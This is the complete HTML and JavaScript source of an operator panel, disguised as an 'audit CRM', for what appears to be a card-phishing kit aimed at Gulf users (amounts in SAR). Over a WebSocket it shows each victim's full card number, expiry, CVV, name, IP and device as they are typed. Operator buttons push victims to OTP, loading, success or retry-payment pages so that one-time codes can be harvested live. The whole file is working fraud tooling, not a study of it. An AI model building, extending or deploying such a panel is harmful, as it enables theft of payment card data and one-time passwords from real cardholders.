<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Audit CRM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        dark: '#0f172a',
                        card: '#1e293b',
                        accent: '#3b82f6',
                        success: '#10b981',
                        danger: '#ef4444',
                        warning: '#f59e0b'
                    },
                    fontFamily: { sans: ['Inter', 'sans-serif'] }
                }
            }
        }
    </script>
    <style>
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #1e293b; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #475569; }
    </style>
</head>
<body class="bg-dark text-slate-300 font-sans min-h-screen p-6">

    <!-- Header -->
    <header class="flex items-center justify-between mb-8">
        <div>
            <h1 class="text-2xl font-bold text-white flex items-center gap-2">
                <span class="w-3 h-3 rounded-full bg-success animate-pulse"></span>
                Pro Audit Control
            </h1>
            <p class="text-sm text-slate-500">Live monitoring & command center</p>
        </div>
        <div class="flex gap-4">
            <div class="bg-card px-4 py-2 rounded-lg border border-slate-700">
                <span class="text-xs text-slate-500 block">Total Clients</span>
                <span id="totalClients" class="text-xl font-bold text-white">0</span>
            </div>
            <div class="bg-card px-4 py-2 rounded-lg border border-slate-700">
                <span class="text-xs text-slate-500 block">Online</span>
                <span id="onlineClients" class="text-xl font-bold text-success">0</span>
            </div>
        </div>
    </header>

    <!-- Main Grid -->
    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        <!-- Client List -->
        <div class="lg:col-span-1 space-y-4">
            <h2 class="text-sm font-bold text-slate-400 uppercase tracking-wider">Active Sessions</h2>
            <div id="clientList" class="space-y-3">
                <!-- Clients will be injected here -->
                <p class="text-center text-slate-600 py-8">Waiting for connections...</p>
            </div>
        </div>

        <!-- Client Details -->
        <div class="lg:col-span-2">
            <div id="emptyState" class="h-full flex flex-col items-center justify-center bg-card border border-slate-700 rounded-2xl border-dashed p-12 text-center opacity-50">
                <svg class="w-16 h-16 text-slate-600 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
                </svg>
                <p class="text-lg font-medium text-slate-400">Select a client to view details</p>
            </div>

            <div id="detailsPanel" class="hidden space-y-6">
                <!-- Status Bar -->
                <div class="bg-card border border-slate-700 rounded-xl p-6 flex items-center justify-between">
                    <div>
                        <h2 id="detailName" class="text-xl font-bold text-white">client-xyz</h2>
                        <div class="flex items-center gap-2 text-sm mt-1">
                            <span id="detailStatus" class="px-2 py-0.5 rounded text-xs bg-success/10 text-success border border-success/20">Online</span>
                            <span id="detailStep" class="text-slate-400">Current Step: Checkout</span>
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <button onclick="sendCommand('BANNED')" class="bg-danger/10 text-danger hover:bg-danger hover:text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors border border-danger/20">Ban IP</button>
                    </div>
                </div>

                <!-- Info Cards -->
                <div class="grid grid-cols-2 gap-4">
                    <!-- CC Info -->
                    <div class="bg-card border border-slate-700 rounded-xl p-6 relative overflow-hidden group">
                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity">
                            <svg class="w-24 h-24 text-accent" fill="currentColor" viewBox="0 0 24 24"><path d="M2 10h20v7a3 3 0 01-3 3H5a3 3 0 01-3-3v-7zm0-4a3 3 0 013-3h14a3 3 0 013 3v2H2V6z"/></svg>
                        </div>
                        <h3 class="text-slate-500 text-xs font-bold uppercase mb-4">Payment Details</h3>
                        <div class="space-y-3 relative z-10">
                            <div>
                                <label class="text-[10px] text-slate-500 block">Card Number</label>
                                <div class="flex items-center gap-2">
                                    <span id="detailCard" class="text-lg font-mono text-white tracking-wider">**** **** **** ****</span>
                                    <span id="detailBrand" class="px-1.5 py-0.5 bg-white/10 rounded text-[10px]">VISA</span>
                                </div>
                            </div>
                            <div class="flex gap-6">
                                <div>
                                    <label class="text-[10px] text-slate-500 block">Expiry</label>
                                    <span id="detailExp" class="font-mono text-white">MM/YY</span>
                                </div>
                                <div>
                                    <label class="text-[10px] text-slate-500 block">CVC</label>
                                    <span id="detailCvc" class="font-mono text-white text-danger">***</span>
                                </div>
                            </div>
                            <div class="pt-2 border-t border-slate-700 mt-2">
                                <label class="text-[10px] text-slate-500 block">Cardholder</label>
                                <span id="detailHolder" class="text-sm font-medium text-white">-</span>
                            </div>
                        </div>
                    </div>

                    <!-- Device Info -->
                    <div class="bg-card border border-slate-700 rounded-xl p-6">
                        <h3 class="text-slate-500 text-xs font-bold uppercase mb-4">Device & IP</h3>
                        <div class="space-y-3">
                            <div>
                                <label class="text-[10px] text-slate-500 block">IP Address</label>
                                <span id="detailIp" class="text-sm text-accent font-mono">0.0.0.0</span>
                            </div>
                            <div>
                                <label class="text-[10px] text-slate-500 block">User Agent</label>
                                <p id="detailDevice" class="text-xs text-slate-400 leading-relaxed line-clamp-3">-</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Actions -->
                <div class="bg-card border border-slate-700 rounded-xl p-6">
                    <h3 class="text-slate-500 text-xs font-bold uppercase mb-4">Actions & Redirects</h3>
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
                        <button onclick="sendCommand('REDIRECT', {url: 'otp.html'})" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-3 rounded-lg text-sm font-medium transition-colors">
                            Send to OTP
                        </button>
                        <button onclick="sendCommand('REDIRECT', {url: 'loading.html'})" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-3 rounded-lg text-sm font-medium transition-colors">
                            Send to Loading
                        </button>
                        <button onclick="sendCommand('REDIRECT', {url: 'success.html'})" class="bg-success text-white px-4 py-3 rounded-lg text-sm font-medium hover:bg-success/90 transition-colors">
                            Approve (Success)
                        </button>
                        <button onclick="sendCommand('REDIRECT', {url: 'checkout_gulf.html'})" class="bg-warning text-white px-4 py-3 rounded-lg text-sm font-medium hover:bg-warning/90 transition-colors">
                            Retry Payment
                        </button>
                    </div>
                </div>

                <!-- Logs -->
                <div class="bg-card border border-slate-700 rounded-xl p-6">
                    <h3 class="text-slate-500 text-xs font-bold uppercase mb-4">Activity Log</h3>
                    <div id="detailLogs" class="space-y-2 max-h-40 overflow-y-auto text-xs font-mono text-slate-400">
                        <!-- logs -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- WebSocket & State ---
        const host = window.location.protocol.startsWith('http') ? window.location.host : 'localhost:8000';
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = `${protocol}//${host}/ws/panel`;

        let ws;
        let clients = {};
        let activeClientId = null;

        function connect() {
            ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                console.log("Connected to Panel WS");
            };

            ws.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                handleMessage(msg);
            };

            ws.onclose = () => {
                console.log("Disconnected. Reconnecting...");
                setTimeout(connect, 3000);
            };
        }

        connect();

        function handleMessage(msg) {
            console.log("Msg:", msg);
            switch(msg.type) {
                case 'init_state':
                    clients = msg.clients;
                    renderClientList();
                    updateStats();
                    break;
                case 'client_update': // New connection or overall update
                case 'data_update':
                case 'step_update':
                    // If msg.client is the full object
                    if (msg.client) clients[msg.client.client_id] = msg.client;
                    // If partial update
                    else if (msg.client_id && clients[msg.client_id]) {
                        if (msg.type === 'step_update') clients[msg.client_id].step = msg.step;
                        if (msg.type === 'data_update') clients[msg.client_id].data = msg.data.data; // msg.data is the Full client obj in my backend code? No, let's check backend.
                        // Backend: "data_update" -> client_id, data (the FULL client object)
                        if (msg.type === 'data_update') clients[msg.client_id] = msg.data;
                    }
                    renderClientList();
                    if (activeClientId === (msg.client_id || (msg.client ? msg.client.client_id : null))) {
                        renderDetails(activeClientId);
                    }
                    updateStats();
                    break;
                case 'client_offline':
                    if (clients[msg.client_id]) clients[msg.client_id].status = 'offline';
                    renderClientList();
                    updateStats();
                    break;
            }
        }

        function updateStats() {
            const list = Object.values(clients);
            document.getElementById('totalClients').textContent = list.length;
            document.getElementById('onlineClients').textContent = list.filter(c => c.status === 'online').length;
        }

        function renderClientList() {
            const container = document.getElementById('clientList');
            const list = Object.values(clients).sort((a,b) => (b.status === 'online') - (a.status === 'online')); // Online first
            
            if (list.length === 0) {
                container.innerHTML = '<p class="text-center text-slate-600 py-8">Waiting for connections...</p>';
                return;
            }

            container.innerHTML = list.map(c => `
                <div onclick="selectClient('${c.client_id}')" 
                     class="group cursor-pointer bg-card border ${activeClientId === c.client_id ? 'border-accent' : 'border-slate-700'} hover:border-slate-500 rounded-xl p-4 transition-all">
                    <div class="flex justify-between items-start mb-2">
                        <div class="flex items-center gap-2">
                            <span class="w-2 h-2 rounded-full ${c.status === 'online' ? 'bg-success' : 'bg-slate-600'}"></span>
                            <span class="font-mono text-sm font-bold text-white truncate w-24">${c.client_id}</span>
                        </div>
                        <span class="text-[10px] bg-slate-800 px-2 py-0.5 rounded text-slate-400 capitalize">${c.step || 'Idle'}</span>
                    </div>
                    ${c.data.numero_carte ? `
                        <div class="flex items-center gap-2 text-xs text-slate-300">
                             <span class="bg-white/5 px-1.5 rounded">${c.data.card_brand || 'CC'}</span>
                             <span class="font-mono">...${c.data.numero_carte.slice(-4)}</span>
                             <span class="text-success ml-auto font-bold">${c.data.montant || 0} SAR</span>
                        </div>
                    ` : '<p class="text-xs text-slate-600 italic">No data yet</p>'}
                </div>
            `).join('');
        }

        function selectClient(id) {
            activeClientId = id;
            document.getElementById('emptyState').classList.add('hidden');
            document.getElementById('detailsPanel').classList.remove('hidden');
            renderClientList(); // To update active border
            renderDetails(id);
        }

        function renderDetails(id) {
            const c = clients[id];
            if (!c) return;

            // DOM Elements
            document.getElementById('detailName').textContent = c.client_id;
            document.getElementById('detailStatus').textContent = c.status;
            document.getElementById('detailStep').textContent = `Current Step: ${c.step}`;
            document.getElementById('detailStatus').className = `px-2 py-0.5 rounded text-xs border ${c.status === 'online' ? 'bg-success/10 text-success border-success/20' : 'bg-slate-700/50 text-slate-500 border-slate-600'}`;
            
            // Card Data
            const d = c.data || {};
            document.getElementById('detailCard').textContent = d.numero_carte || '**** **** **** ****';
            document.getElementById('detailBrand').textContent = d.card_brand || 'Unknown';
            document.getElementById('detailExp').textContent = d.expiry || '--/--';
            document.getElementById('detailCvc').textContent = d.cvv || '***';
            document.getElementById('detailHolder').textContent = d.full_name || '-';
            
            // Meta
            document.getElementById('detailIp').textContent = d.adresse_ip || 'Unavailable';
            document.getElementById('detailDevice').textContent = d.device || 'Unavailable';

            // Logs
            const logsContainer = document.getElementById('detailLogs');
            logsContainer.innerHTML = (c.logs || []).map(l => `<div><span class="opacity-50">[LOG]</span> ${l}</div>`).join('') || '<div class="text-slate-600 italic">No logs available</div>';
        }

        function sendCommand(cmd, payload = {}) {
            if (!activeClientId || !ws) return;
            ws.send(JSON.stringify({
                command: cmd,
                target_id: activeClientId,
                payload: payload
            }));
        }

    </script>
</body>
</html>
